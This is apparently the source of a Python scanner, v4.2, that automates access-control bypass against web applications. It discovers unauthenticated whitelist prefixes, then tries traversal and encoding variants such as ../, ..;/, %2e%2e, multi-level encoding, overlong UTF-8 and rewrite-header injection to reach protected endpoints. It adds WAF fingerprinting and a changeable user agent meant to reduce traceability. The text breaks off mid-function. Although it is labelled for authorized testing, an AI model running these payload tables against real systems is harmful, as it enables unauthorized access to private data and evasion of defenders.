#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
whitelist_bypass_v4.py —— 免鉴权白名单借道 × 编码穿越 × 路径拼接 一体化越权探测 v4.2
================================================================
单文件独立运行，无需 authz_bypass_v3_4.py / whitelist_probe.py。
仅限已授权的安全测试 / 渗透测试场景使用。

两阶段自动化：
  阶段一  免鉴权白名单前缀探测（匿名 404 指纹法，可选 --no-discover 关闭）
  阶段二  自动越权绕过：
            · 借道前缀  —— 实测/手工白名单前缀 × 17 种编码穿越形态全积
            · 目录穿越  —— ../ 族（/x/../、%2e%2e、双重/三重编码、超长 UTF-8）
            · 分号穿越  —— ..;/ 族（Tomcat/网关参数裁剪差异）
            · 编码解码  —— %2f/%252f/%u002f 分隔符替换族
            · 路径拼接  —— 斜杠/点段/后缀/结构/尾缀拼接族
            · 分号参数  —— 矩阵参数注入族
            · 解码跳跃  —— 四重编码/Unicode代理对/UTF-16 BE 多次解码错位
            · 头部注入  —— X-Original-URI/X-Rewrite-URL/X-Forwarded 反代覆盖
            · 内容协商  —— Accept/Accept-Encoding/AJAX 头分支差异
            · HTTP方法  —— 方法覆盖族（--probe-method 显式开启）
          判定体系继承 v3.4：三基线 + evaluate 判定链 + ★二次复核
          + 重定向链联合分析 + 熔断 + 基线健康检查 + 证据留存。

v4.2 更新：
  · 交互模式：不带参数启动时逐个输入目标URL（非法URL排除、回车结束、
    go 立即开始），与参数启动完全兼容
  · 新增 解码跳跃/头部注入/内容协商 三类变形插件
  · content_similarity 升级为多指标融合：长度/JSON值画像/DOM骨架/
    字符级对齐/指纹，权重按内容形态自适应（无第三方依赖）
  · ProgressReporter 彩色进度条：ETA/实时命中率/近10次RTT
  · stdout 强制 UTF-8（防 Windows cp936 控制台打印特殊符号崩溃）

相对 authz_bypass_v3_4.py v3.4 / whitelist_probe.py v2.0 的缺陷修复：
  [D1]  前缀折叠死代码：v2.0 bypass_target 中折叠逻辑条件块体仅 pass，
        /api 与 /api/v1 会同时注入、变形配额被同根因重复占用。
        → 本版 fold_prefixes() 实现真正的父覆盖子折叠后再注入。
  [D2]  白名单探测 200+登录页正文误判：v3.4 routed 判定只看状态码与
        Location，SPA 未登录首页(HTTP 200)会被误判为白名单前缀。
        → classify() 增加正文登录特征检查（LOGIN_PAGE_RE 命中即排除）。
  [D3]  探测范围仅"根 + 首段上下文"两级，漏掉中间层级白名单
        （如 /app/admin 下的 /app/admin/static）。
        → target_contexts() 展开全部祖先目录。
  [D4]  借道插件内置前缀挤占实测前缀：v3.4 StaticPrefixPlugin 内置清单
        在前、--whitelist-prefix/探测结果在后，prefix_cap 截断时真实
        有效的实测前缀反而先被裁。
        → 本版实测/手工前缀无条件全形态覆盖，内置前缀再按经典形态
          优先 + 上限展开。
  [D5]  evaluate 对 5xx 无信号：基线 401/403 而变形 500/502（请求已
        穿透鉴权层触发后端异常）返回空判定，丢失跟进线索。
        → 增加 5xx 状态迁移 △需复核 信号。
  [D6]  classify 对非登录 302（WAF 挑战/CDN 区域跳转）落入"无差异"漏报。
        → 归入"中置信·跳转待查"并记录 Location。
  [D7]  boundary_checks 大小写检测仅首字符 swapcase。
        → 增加全大写/首字母大写两个变体。
  [D8]  trace_redirect_chain 循环检测仅比较 path 忽略 query，
        同路径不同 query 的合法跳转被误判为循环。
        → 以完整 URL（去 fragment）为循环键。
  [D9]  阶段一 len 为 4096 截断后的解码长度，报告使用者易误读。
        → 统一记录流式读取的真实字节长度。
  [D10] 批量编排缺基线健康检查：低权限会话过期后，剩余变形全部按
        失效基线误判。→ 移植 v3.4 G7 周期性基线复查 + 熔断。

用法
----------------------------------------------------------------
python whitelist_bypass_v4.py --url http://t1/app/admin/user/list
python whitelist_bypass_v4.py --url-file targets.txt --cookie "sid=xxx" --high-cookie "sid=admin"
python whitelist_bypass_v4.py                                # 交互模式：逐个输入目标URL
python whitelist_bypass_v4.py --url http://t/... --probe-only             # 仅阶段一
python whitelist_bypass_v4.py --url http://t/... --no-discover \
       --whitelist-prefix static --whitelist-prefix public                 # 仅阶段二(手工前缀)
python whitelist_bypass_v4.py --url http://t/... --combine --probe-method # 组合变形+方法覆盖
"""

import argparse
import asyncio
import csv
import difflib
import hashlib
import json
import os
import random
import re
import statistics
import sys
import time
import unicodedata
from collections import defaultdict
from urllib.parse import urljoin, urlparse

try:
    import aiohttp
    from aiohttp import ClientTimeout
    from yarl import URL
except ImportError:
    print("[-] 缺少依赖，请先执行: pip install aiohttp")
    sys.exit(1)

VERSION = "4.2"
DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

# ---------------------------------------------------------------------------
# 常量
# ---------------------------------------------------------------------------
OK_CODES = {200, 201, 202, 204}
REDIRECT_CODES = {301, 302, 303, 307, 308}
DENY_CODES = {401, 403}
DENY_LIKE = DENY_CODES | {405}
ROUTED_CODES = {400, 404, 405, 410}          # 鉴权层放行后路由层典型状态码
SERVER_ERR_CODES = {500, 501, 502, 503, 504}  # [D5] 状态迁移信号
NO_BODY_METHODS = {"HEAD", "OPTIONS", "TRACE"}
AUTH_SIM_THRESHOLD = 0.85
MAX_BODY = 512 * 1024

# Location 跳转目标中的登录特征
LOGIN_HINT_RE = re.compile(
    r"(?i)login|signin|sign-in|sso|cas\b|/auth|oauth|token|passport|redirect")
# [D2] 响应正文中的登录页特征（含中文站点高频词）
LOGIN_PAGE_RE = re.compile(
    r"(?i)login|signin|sign.?in|password|passwd|username|"
    r"登录|登陆|请先登录|用户名|账号登录")
DENY_HINT = re.compile(
    r"(?i)access denied|forbidden|unauthorized|permission denied|not allowed|"
    r"无权限|没有权限|权限不足|拒绝访问|请先登录|尚未登录|未登录|登录已过期|重新登录")

DYN_PATTERNS = [
    (re.compile(r"\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(\.\d+)?"), "<DATETIME>"),
    (re.compile(r"\d{10,13}"), "<TIMESTAMP>"),
    (re.compile(r"(?i)((?:csrf|token|nonce|ticket|jsessionid|session)[\w-]*[\"']?\s*[:=]\s*[\"'])[^\"'&<>\s]+"),
     r"\1<VALUE>"),
    (re.compile(r"[0-9a-fA-F]{32,}"), "<HEX>"),
]
TAG_RE = re.compile(r"(?is)<(script|style)[^>]*>.*?</\1>|<[^>]+>")
WS_RE = re.compile(r"\s+")

# ---------------------------------------------------------------------------
# 借道编码穿越形态表：(描述, 拼接串, 分隔符是否已含)
#   False = 拼接 orig_path（含前导斜杠，保持原路径层级）
#   True  = 拼接 segs（穿越串自带分隔符，多一级/少一层斜杠的差异形态）
# 按实战命中率排序，截断时低优先形态先被裁，保证经典形态覆盖所有前缀。
# v4 新增 %2e./ .%2e/ 混合点（字面点过滤绕过经典形态）与 ..%252f 双重混合。
# ---------------------------------------------------------------------------
DETOUR_FORMS = (
    ("../", "/..", False),
    ("..;/", "/..;", False),
    ("%2e%2e", "/%2e%2e", False),
    ("..%2f", "/..%2f", True),
    ("%2e%2e%2f", "/%2e%2e%2f", True),
    ("%2E%2E大写", "/%2E%2E", False),
    ("..%3b编码分号", "/..%3b", False),
    ("%252e%252e双重编码", "/%252e%252e", False),
    ("%2e%2e%5c编码反斜杠", "/%2e%2e%5c", True),
    ("....//双写", "/....//", True),
    ("%2e./混合点", "/%2e.", False),
    (".%2e/混合点2", "/.%2e", False),
    ("%c0%ae%c0%af超长UTF8", "/%c0%ae%c0%af", True),
    ("全角．．／", "/．．／", True),
    ("..\\反斜杠", "/..\\", True),
    ("..%252f双重混合", "/..%252f", True),
    ("%25252e三重编码", "/%25252e%25252e", False),
)

# 借道内置免鉴权候选（实测/手工前缀优先于本清单，见 [D4]）
BUILTIN_DETOUR_PREFIXES = (
    "static", "public", "assets", "res", "js", "css", "images", "i", "fonts", "media",
    "files", "resources", "webjars", "error", "favicon.ico", "servlet",
    "druid", "swagger", "swagger-ui", "swagger-ui.html", "v2/api-docs", "v3/api-docs",
    "api-docs", "doc", "docs", "actuator", "health", "metrics", "info",
    "login", "logout", "register", "captcha", "verify", "auth", "oauth", "sso",
    "token", "console", "monitor", "api", "open", "guest", "h5", "wx", "wechat",
)

# 阶段一候选字典（按生态分组，用于白名单探测）
CANDIDATE_GROUPS = {
    "静态资源": [
        "static", "statics", "public", "public_html", "assets", "asset",
        "res", "resources", "resource", "js", "css", "images", "image",
        "img", "imgs", "pics", "pic", "photo", "photos", "media", "videos",
        "fonts", "icons", "icon", "files", "file", "download", "downloads",
        "upload", "uploads", "uploadfile", "uploadfiles", "attachment",
        "attachments", "dist", "build", "webpack", "pkg", "lib", "libs",
        "webjars", "favicon.ico", "robots.txt", "sitemap.xml",
        "crossdomain.xml", "css.map", "swagger-ui.css",
    ],
    "Java生态": [
        "druid", "druid/index.html", "swagger", "swagger-ui", "swagger-ui.html",
        "swagger-resources", "v2/api-docs", "v3/api-docs", "api-docs",
        "doc.html", "docs", "doc", "api", "api-doc", "knife4j", "gun",
        "gateway", "servlet", "console", "monitor", "monitoring", "sentinel",
        "nacos", "dubbo", "eureka", "hystrix", "turbine", "zipkin",
        "skywalking", "jolokia", "jmx-console", "web-console", "manager",
        "html", "manager/html", "error", "test", "demo", "jsp", "j_spring_security_check",
    ],
    "SpringActuator": [
        "actuator", "actuator/health", "actuator/env", "actuator/beans",
        "actuator/mappings", "actuator/configprops", "actuator/metrics",
        "actuator/trace", "actuator/heapdump", "actuator/loggers",
        "actuator/threaddump", "actuator/info", "actuator/gateway",
        "health", "healthz", "metrics", "info", "env", "beans", "mappings",
    ],
    "认证端点": [
        "login", "login.html", "login.do", "signin", "sign-in", "logout",
        "register", "signup", "captcha", "captcha.jpg", "verify", "kaptcha",
        "getCode", "sendCode", "sms", "auth", "authorize", "oauth", "oauth2",
        "openid", "sso", "cas", "token", "tokens", "jwt", "refresh",
        "refresh_token", "password", "forget", "resetpwd", "unauth",
        "401", "403", "validate", "checkcode", "imagecode",
    ],
    "微软PHP杂项": [
        "elmah", "elmah.axd", "trace.axd", "WebResource.axd", "ScriptResource.axd",
        "graphql", "graphiql", "playground", "phpinfo.php", "adminer.php",
        "wp-login.php", "ping", "pong", "version", "status", "heartbeat",
        "alive", "flag", "metrics.json", "actuator.json", "dump", "info.php",
    ],
    "前端移动": [
        "h5", "m", "mobile", "app", "wap", "wx", "wechat", "weixin",
        "android", "ios", "pc", "web", "www", "index.html", "main.html",
        "home", "portal", "front", "frontend", "page", "pages", "views",
    ],
    "中文业务": [
        "getCode", "sendSms", "smscode", "yzm", "tucao", "about", "help",
        "faq", "notice", "announcement", "agreement", "privacy", "protocol",
        "share", "preview", "view", "read", "news", "article", "banner",
        "config", "configs", "dict", "common", "util", "utils", "data",
    ],
}

ROBOTS_DISALLOW_RE = re.compile(r"(?im)^(?:disallow|allow):\s*(\S+)")
SITEMAP_LOC_RE = re.compile(r"(?im)<loc>\s*([^<\s]+)\s*</loc>")
HTML_PATH_RE = re.compile(r"""(?:href|src|action|data-url)\s*=\s*["']([^"'#?]+)""")

# WAF 指纹三级（头部强 / 正文强 / 正文弱+状态码佐证）
WAF_HEADER_SIGNATURES = [
    (re.compile(r"(?i)cloudflare|cf-ray|__cf_bm"), "Cloudflare"),
    (re.compile(r"(?i)akamai|akamaighost"), "Akamai"),
    (re.compile(r"(?i)sucuri"), "Sucuri"),
    (re.compile(r"(?i)f5.{0,10}bigip|bigipserver"), "F5 BIG-IP"),
    (re.compile(r"(?i)mod_?security"), "ModSecurity"),
    (re.compile(r"(?i)aliyun[-_]?waf|waf-cg|x-acw-"), "阿里云WAF"),
    (re.compile(r"(?i)tencent[-_ ]?waf|tsec[-_]?waf|stgw"), "腾讯云WAF"),
    (re.compile(r"(?i)safedog|safe3"), "安全狗"),
    (re.compile(r"(?i)yunsuo"), "云锁"),
    (re.compile(r"(?i)baidu[-_]?waf|yunjiasu"), "百度云防护"),
]
WAF_BODY_STRONG = [
    (re.compile(r"请求被拦截|阻断了您的访问|非法请求已被|已被.{0,10}安全.{0,10}拦截|web应用防火墙"), "通用WAF"),
    (re.compile(r"(?i)access denied by|blocked by.{0,20}(waf|firewall|security)|security rule (violation|triggered)"), "安全防护"),
    (re.compile(r"(?i)mod_?security.{0,20}rules?"), "ModSecurity"),
    (re.compile(r"(?i)incident id|support id.{0,10}[0-9a-f-]{8,}"), "WAF事件页"),
]
WAF_BODY_WEAK = [
    (re.compile(r"安全拦截|访问被拦截|请求异常.{0,10}拦截"), "安全拦截"),
    (re.compile(r"(?i)request blocked|malicious request|attack detected"), "安全防护"),
]
WAF_CORROBORATE_CODES = {403, 406, 418, 429, 501, 503}
WAF_HEADER_KEYS = ("server", "x-cdn", "x-waf", "x-sucuri-id", "cf-ray",
                   "x-acw-sc__v2", "x-acw-sc__v3", "x-backside-transport")

SENSITIVE_KEY_RE = re.compile(
    r"(?i)phone|mobile|id_?card|bank|balance|salary|token|secret|email|address|password|credential")
REDACT_PATTERNS = [
    (re.compile(r"(?<!\d)1[3-9]\d{9}(?!\d)"), "<手机号>"),
    (re.compile(r"(?<!\d)\d{17}[\dXx](?!\d)"), "<身份证>"),
    (re.compile(r"(?i)\b[\w.+-]+@[\w-]+\.[\w.-]+\b"), "<邮箱>"),
    (re.compile(r"(?<!\d)\d{16,19}(?!\d)"), "<银行卡>"),
    # [修复#16] 兜底：紧邻其他数字（如 86 前缀拼接）导致上述带断言
    # 规则全部漏过的长数字串，统一打码
    (re.compile(r"(?<!\d)\d{11,}(?!\d)"), "<长数字>"),
]

CATEGORY_MAP = {
    "D": "借道前缀", "C": "目录穿越", "B": "..;/穿越", "R": "编码解码",
    "S": "路径拼接", "A": "分号参数", "U": "URL解码跳跃", "H": "头部注入",
    "N": "内容协商", "I": "HTTP方法", "X": "组合变形",
}


# ---------------------------------------------------------------------------
# 工具函数
# ---------------------------------------------------------------------------
def pad(s, width):
    """按东亚字符宽度对齐（控制台表格用）"""
    w = sum(2 if unicodedata.east_asian_width(ch) in "WF" else 1 for ch in str(s))
    return str(s) + " " * max(0, width - w)


def mask_cookie(cookie):
    if not cookie:
        return ""
    return re.sub(r"=([^;\s]{4})[^;\s]*", r"=\1***", cookie)


def sha16(s):
    return hashlib.sha256((s or "").encode("utf-8", "replace")).hexdigest()[:16]


def redact_text(text):
    for pat, rep in REDACT_PATTERNS:
        text = pat.sub(rep, text or "")
    return text


def pct_encode_char(ch, double=False):
    """按 UTF-8 字节做百分号编码（double=True 双重编码）"""
    return "".join((f"%25{b:02x}" if double else f"%{b:02x}") for b in ch.encode("utf-8"))


def pct_encode(s, double=False):
    return "".join(pct_encode_char(ch, double) for ch in s)


def downgrade_conf(conf):
    return {"高": "中", "中": "低"}.get(conf, conf)


def split_path(url):
    p = urlparse(url)
    segs = [s for s in p.path.split("/") if s != ""]
    return f"{p.scheme}://{p.netloc}", segs, p.query


def is_login_redirect(location):
    return bool(location) and bool(LOGIN_HINT_RE.search(location))


def norm_seg(path):
    return (path or "").strip().strip("/")


def build_url(base, ctx, path):
    p = f"/{ctx}/{path}" if ctx else f"/{path}"
    return base.rstrip("/") + p


def fold_prefixes(paths):
    """[D1 修复] 父前缀已存在时剔除其子前缀。
    v2.0 中该逻辑是只有 pass 的死代码，/api 与 /api/v1 同时注入，
    借道配额被同根因重复占用。
    注意：仅适用于实测来源的前缀——实测已验证父前缀匿名放行，
    父子同放行时折叠同根因变形是安全的（见 merge_prefixes）。"""
    cleaned = sorted({norm_seg(p) for p in paths if norm_seg(p)})
    return [p for p in cleaned
            if not any(p != q and p.startswith(q + "/") for q in cleaned)]


def merge_prefixes(manual, found):
    """[修复#2] 实测与手工前缀分治合并：
    · 实测(found)：探测已验证匿名放行 → 父子折叠安全（D1）；
    · 手工(manual)：未经实测验证，/api 401 而 /api/v1 白名单的
      精确匹配场景下两者都需保留，不参与折叠，仅去重。"""
    folded = fold_prefixes(found)
    seen = set(folded)
    manual_clean = []
    for p in manual or []:
        n = norm_seg(p)
        if n and n not in seen:
            seen.add(n)
            manual_clean.append(n)
    return folded + manual_clean


# ---------------------------------------------------------------------------
# 响应指纹 / 内容相似度
# ---------------------------------------------------------------------------
def fingerprint(body):
    """稳定性检查用指纹：动态字段归一化 + title 提权"""
    if not body:
        return ""
    text = body[:12000]
    for pat, rep in DYN_PATTERNS:
        text = pat.sub(rep, text)
    m = re.search(r"(?is)<title[^>]*>(.*?)</title>", text)
    title = m.group(1).strip() if m else ""
    return (title + "\n" + text)[:4000]


def similarity(a, b):
    fa, fb = fingerprint(a), fingerprint(b)
    if not fa and not fb:
        return 1.0
    if not fa or not fb:
        return 0.0
    return difflib.SequenceMatcher(None, fa, fb).ratio()


def visible_text(body):
    return WS_RE.sub(" ", TAG_RE.sub(" ", body or "")).strip()


def json_value_profile(body):
    """JSON 值类型画像：key 路径 → 值类型 + 量级"""
    try:
        data = json.loads(body)
    except (ValueError, TypeError):
        return None
    profile = {}

    def classify(val):
        if val is None:
            return "null"
        if isinstance(val, bool):
            return "bool"
        if isinstance(val, (int, float)):
            if val == 0:
                return "num:0"
            return f"num:{len(str(int(abs(val))))}"
        if isinstance(val, str):
            n = len(val)
            return "str:0" if n == 0 else ("str:s" if n < 10 else ("str:m" if n < 100 else "str:l"))
        if isinstance(val, list):
            return f"list:{len(val)}"
        if isinstance(val, dict):
            return f"dict:{len(val)}"
        return "unknown"

    def walk(o, path):
        if isinstance(o, dict):
            for k, v in o.items():
                p = f"{path}.{k}" if path else str(k)
                profile[p] = classify(v)
                walk(v, p)
        elif isinstance(o, list):
            for item in o[:20]:
                walk(item, path + "[]")

    walk(data, "")
    return profile


def json_value_similarity(body_a, body_b):
    """JSON 值类型感知相似度：key Jaccard(60%) + 值类型匹配(40%)"""
    pa, pb = json_value_profile(body_a), json_value_profile(body_b)
    if pa is None or pb is None:
        return None
    if not pa and not pb:
        return 1.0
    keys_a, keys_b = set(pa.keys()), set(pb.keys())
    union = keys_a | keys_b
    if not union:
        return 1.0
    key_sim = len(keys_a & keys_b) / len(union)
    common = keys_a & keys_b
    type_match = (sum(1 for k in common if pa[k] == pb[k]) / len(common)) if common else 0.0
    return 0.6 * key_sim + 0.4 * type_match


def _ratio(a, b, cutoff=0.0):
    sm = difflib.SequenceMatcher(None, a, b)
    if cutoff > 0 and sm.real_quick_ratio() < cutoff:
        return 0.0
    return sm.ratio()


_DOM_TAG_RE = re.compile(r"<([a-zA-Z][a-zA-Z0-9:-]*)[^>]*>")


def _dom_skeleton(html):
    """DOM 结构骨架：标签名序列（正则实现，免 BeautifulSoup 依赖）。
    结构相同文案不同的页面（同模板）骨架高相似，用于 HTML 场景加权。"""
    if not html:
        return ""
    tags = _DOM_TAG_RE.findall(html[:20000])
    if not tags:
        return ""
    return ">".join(t.lower() for t in tags[:200])


def content_similarity(body_a, ctype_a, body_b, ctype_b, cutoff=0.0):
    """[v4.2 升级] 多指标融合相似度：长度 / JSON 值画像 / DOM 骨架 /
    字符级对齐 / 指纹，权重按内容形态自适应并按已启用指标归一化。
    空间上仅累加存在指标的权重（避免建议稿中 score*weight 双重相乘的 bug）。"""
    if not body_a and not body_b:
        return 1.0
    if not body_a or not body_b:
        return 0.0

    la, lb = len(body_a), len(body_b)
    size = max(la, lb)
    scores, weights = {}, {}

    # 1. 长度相似度：长度悬殊的内容几乎不可能是同源响应
    scores["len"], weights["len"] = 1.0 - abs(la - lb) / max(la, lb, 1), 0.10

    ca, cb = (ctype_a or "").lower(), (ctype_b or "").lower()
    # 2. JSON 值类型画像（双 JSON 时）
    if "json" in ca and "json" in cb:
        val_sim = json_value_similarity(body_a, body_b)
        if val_sim is not None:
            scores["json"], weights["json"] = val_sim, 0.45

    # 3. HTML/XML DOM 骨架
    if "html" in ca or "html" in cb or "xml" in ca or "xml" in cb:
        da, db = _dom_skeleton(body_a), _dom_skeleton(body_b)
        if da and db:
            scores["dom"], weights["dom"] = _ratio(da, db), 0.30

    # 4. 字符级对齐（可见文本 + 动态归一化；小文本权重更高）
    ta, tb = visible_text(body_a)[:4000], visible_text(body_b)[:4000]
    if ta and tb:
        for pat, rep in DYN_PATTERNS:
            ta, tb = pat.sub(rep, ta), pat.sub(rep, tb)
        tw = 0.55 if size > 500 else 0.70
        scores["text"], weights["text"] = _ratio(ta, tb, cutoff), tw
    elif not ta and not tb:
        scores["text"], weights["text"] = 1.0, 0.55

    # 5. 指纹（动态字段归一化 + title 提权）粗筛
    fa, fb = fingerprint(body_a), fingerprint(body_b)
    if fa and fb:
        scores["fp"], weights["fp"] = _ratio(fa[:500], fb[:500]), 0.20

    total_w = sum(weights.values())
    if not total_w:
        return 0.0
    fused = sum(scores[k] * weights[k] for k in scores) / total_w
    # 双 JSON 且值画像可用时取 max：值类型画像是 API 响应的权威信号，
    # 纯融合会稀释它（数值漂移场景 <0.9 判定阈值 → 误报为"内容不同"），
    # v4.1 语义为直接返回 val_sim，此处保证融合只增不减。
    if "json" in scores:
        return max(scores["json"], fused)
    return fused


def _leaf2(path):
    """取 key 路径末两段（剥去数组下标），保留结构信息"""
    parts = [p for p in path.replace("[]", "").split(".") if p]
    return tuple(parts[-2:])


def sensitive_field_overlap(base_high_body, resp_body):
    """高权限基线敏感字段在变形响应中的命中率。
    [修复#8] 以末两段路径匹配替代单段叶名：data.items[].user.phone
    （→('user','phone')）不再与浅层 phone（→('phone',)）等同，防止
    公开页同名字段造成 ★高 误报；单字段命中时再要求值类型一致。
    返回 (命中率, 命中字段) 或 None。"""
    pa = json_value_profile(base_high_body or "")
    pb = json_value_profile(resp_body)
    if not pa or not pb:
        return None
    leaf = lambda prof: {_leaf2(k) for k in prof}
    sens = {k for k in leaf(pa) if SENSITIVE_KEY_RE.search(k[-1])}
    if not sens:
        return None
    hit = sens & leaf(pb)
    if not hit:
        return None
    rate = len(hit) / len(sens)
    if len(sens) == 1:
        pa_t = {v for k, v in pa.items() if _leaf2(k) in hit}
        pb_t = {v for k, v in pb.items() if _leaf2(k) in hit}
        if pa_t and pb_t and not (pa_t & pb_t):
            return None
    return rate, [".".join(h) for h in sorted(hit)]


# ---------------------------------------------------------------------------
# 响应信号：WAF / CDN / 头信号 / RTT 异常
# ---------------------------------------------------------------------------
def detect_waf(resp):
    """三级指纹：头部强 → 正文强 → 正文弱(需拦截类状态码佐证)"""
    code = resp.get("code", 0)
    headers = resp.get("headers", {})
    header_blob = " ".join(
        [resp.get("server", "")]
        + [f"{k}:{v}" for k, v in headers.items() if k.lower() in WAF_HEADER_KEYS])
    for pat, name in WAF_HEADER_SIGNATURES:
        if pat.search(header_blob):
            return name
    body_text = visible_text(resp.get("body", ""))[:2000]
    for pat, name in WAF_BODY_STRONG:
        if pat.search(body_text):
            return name
    if code in WAF_CORROBORATE_CODES:
        for pat, name in WAF_BODY_WEAK:
            if pat.search(body_text):
                return name
    return None


def is_cached(resp):
    cache_status = resp.get("cache_status", "").upper()
    age = resp.get("age", "")
    if cache_status in ("HIT", "HIT-FROM-CACHE"):
        return True
    if cache_status == "DYNAMIC":
        return False
    return bool(age and age != "0")


def header_signals(resp, base_low):
    signals = []
    resp_h = {k.lower(): v for k, v in resp.get("headers", {}).items()}
    base_h = {k.lower(): v for k, v in base_low.get("headers", {}).items()}
    if "set-cookie" in resp_h and "set-cookie" not in base_h:
        signals.append("响应设置新Cookie")
    if "www-authenticate" in resp_h:
        signals.append("响应含WWW-Authenticate头")
    if resp_h.get("x-powered-by") and base_h.get("x-powered-by") \
            and resp_h["x-powered-by"] != base_h["x-powered-by"]:
        signals.append(f"X-Powered-By变化: {base_h['x-powered-by']}→{resp_h['x-powered-by']}")
    if resp_h.get("content-type") and base_h.get("content-type") \
            and resp_h["content-type"] != base_h["content-type"]:
        signals.append(f"Content-Type变化: {base_h['content-type']}→{resp_h['content-type']}")
    return signals


def rtt_anomaly(resp_rtt, base_rtt_list):
    """>=5 样本均值±3σ；2-4 样本稳健极差法（超基线最大 3 倍且绝对差>0.5s）。
    [修复#7] σ 法最小样本 3→5：3-4 样本的 stdev 估计不可靠，
    高延迟波动目标（CDN 节点跳变）会把正常请求全标异常、淹没真实信号。"""
    if not base_rtt_list or len(base_rtt_list) < 2:
        return None
    if len(base_rtt_list) >= 5:
        try:
            mean = statistics.mean(base_rtt_list)
            stdev = statistics.stdev(base_rtt_list)
        except statistics.StatisticsError:
            return None
        if stdev > 0 and abs(resp_rtt - mean) > 3 * stdev:
            return f"RTT异常: {resp_rtt:.3f}s vs 基线均值{mean:.3f}s"
        return None
    hi = max(base_rtt_list)
    if resp_rtt > hi * 3 and resp_rtt - hi > 0.5:
        return f"RTT异常: {resp_rtt:.3f}s vs 基线最大{hi:.3f}s"
    return None


# ---------------------------------------------------------------------------
# [v4.2] 进度条：彩色 + ETA + 实时命中率 + 近10次RTT
# ---------------------------------------------------------------------------
def _ansi_ok():
    """探测 ANSI 支持；Windows 下尝试开启 VT 处理，失败则降级纯文本"""
    if not sys.stdout.isatty():
        return False
    if os.name == "nt":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            handle = kernel32.GetStdHandle(-11)
            mode = ctypes.c_uint32()
            if kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
                kernel32.SetConsoleMode(handle, mode.value | 0x0004)
        except Exception:
            return False
    return True


class ProgressReporter:
    def __init__(self, prefix="    ", use_color=None):
        self.prefix = prefix
        self.start = time.monotonic()
        self.use_color = _ansi_ok() if use_color is None else use_color
        self._last_total = 0

    def update(self, current, total, stars=0, needs=0, rtts=None):
        if total <= 0:
            return
        self._last_total = total
        elapsed = max(time.monotonic() - self.start, 0.1)
        rate = current / elapsed
        eta = (total - current) / max(rate, 0.01)
        avg = statistics.mean(rtts[-10:]) if rtts else 0.0
        bar_len = 26
        filled = int(bar_len * current / total)
        bar = "█" * filled + "·" * (bar_len - filled)
        if self.use_color:
            hit_rate = stars / max(current, 1)
            color = "\033[92m" if hit_rate > 0.05 else "\033[94m"
            star_part = f"{color}★{stars}\033[0m"
        else:
            star_part = f"★{stars}"
        tail = f" RTT {avg:.2f}s" if avg else ""
        msg = (f"\r{self.prefix}{bar} {current}/{total} "
               f"{star_part} △{needs} ETA {eta:4.0f}s{tail}  ")
        try:
            print(msg, end="", flush=True)
        except Exception:
            pass

    def finish(self, final_line=""):
        if self._last_total:
            print("\r" + " " * 78 + "\r", end="")
            if final_line:
                print(self.prefix + final_line)


# ---------------------------------------------------------------------------
# 限速器（间隔 + 抖动 + 429 惩罚 + 成功恢复）与请求管理器
# ---------------------------------------------------------------------------
class RateLimiter:
    def __init__(self, delay, jitter, concurrency):
        self.base_delay = delay
        self.delay = delay
        self.jitter = jitter
        self.sem = asyncio.Semaphore(max(1, concurrency))
        self.last = 0.0
        self.lock = asyncio.Lock()

    async def acquire(self):
        await self.sem.acquire()
        async with self.lock:
            now = time.monotonic()
            gap = self.delay * (1.0 + random.uniform(0, self.jitter))
            wait = self.last + gap - now
            if wait > 0:
                await asyncio.sleep(wait)
            self.last = time.monotonic()

    def release(self):
        self.sem.release()

    def penalize(self):
        self.delay = min(self.delay * 2.0, 5.0)

    def reward(self):
        self.delay = max(self.delay * 0.8, self.base_delay)


def _err_resp(url, error, timeout):
    return {"code": -1, "length": 0, "body": "", "truncated": False,
            "location": "", "ctype": "", "server": "", "cache_status": "",
            "age": "", "headers": {}, "set_cookies": [], "rtt": timeout, "error": error,
            "sent_url": url, "rewritten": False}


class RequestManager:
    """异步请求管理器：anon/low/high 三种身份、DummyCookieJar 防会话污染、
    yarl encoded=True 阻止客户端对 %XX 变形做 requote 改写。"""

    def __init__(self, config):
        self.low_cookie = config.get("low_cookie", "")
        self.high_cookie = config.get("high_cookie", "")
        self.extra_headers = config.get("extra_headers", {})
        self.proxy = config.get("proxy", "")
        self.timeout = config.get("timeout", 15.0)
        # [修复#17] UA 可配置，降低固定指纹溯源面
        self.ua = config.get("ua") or DEFAULT_UA
        self.limiter = RateLimiter(config.get("delay", 0.1),
                                   config.get("jitter", 0.3),
                                   config.get("concurrency", 8))
        self._session = None

    def _get_headers(self, kind):
        headers = {"User-Agent": self.ua, "Accept": "*/*", "Connection": "keep-alive"}
        if kind == "low" and self.low_cookie:
            headers["Cookie"] = self.low_cookie
        elif kind == "high" and self.high_cookie:
            headers["Cookie"] = self.high_cookie
        headers.update(self.extra_headers)
        return headers

    async def _get_session(self):
        if self._session is None or self._session.closed:
            connector = aiohttp.TCPConnector(limit=0, ssl=False)
            self._session = aiohttp.ClientSession(
                timeout=ClientTimeout(total=self.timeout), connector=connector,
                cookie_jar=aiohttp.DummyCookieJar())
        return self._session

    async def _send_once(self, url, method, headers, body):
        start = time.monotonic()
        session = await self._get_session()
        proxy = self.proxy or None
        data = body.encode("utf-8") if body else None
        try:
            req_url = URL(url, encoded=True)  # 防 requote：编码变形必须原样上送
            async with session.request(method, req_url, headers=headers, data=data,
                                       allow_redirects=False, proxy=proxy) as r:
                body_bytes = await r.content.read(MAX_BODY + 1)
                truncated = len(body_bytes) > MAX_BODY
                body_text = body_bytes[:MAX_BODY].decode("utf-8", "replace")
                err = None
                if r.status == 429:
                    self.limiter.penalize()
                    err = "http_429"
                else:
                    self.limiter.reward()
                sent_url = str(r.request_info.url)
                return {
                    "code": r.status, "length": len(body_bytes),
                    "body": body_text, "truncated": truncated,
                    "location": r.headers.get("Location", ""),
                    "ctype": r.headers.get("Content-Type", ""),
                    "server": r.headers.get("Server", ""),
                    "cache_status": r.headers.get("X-Cache", r.headers.get("CF-Cache-Status", "")),
                    "age": r.headers.get("Age", ""),
                    "headers": dict(r.headers),
                    # [修复#10] 多值 Set-Cookie 单独采集：dict(headers) 会
                    # 覆盖同名头，跳转链 Cookie 传递依赖完整列表
                    "set_cookies": list(r.headers.getall("Set-Cookie", [])),
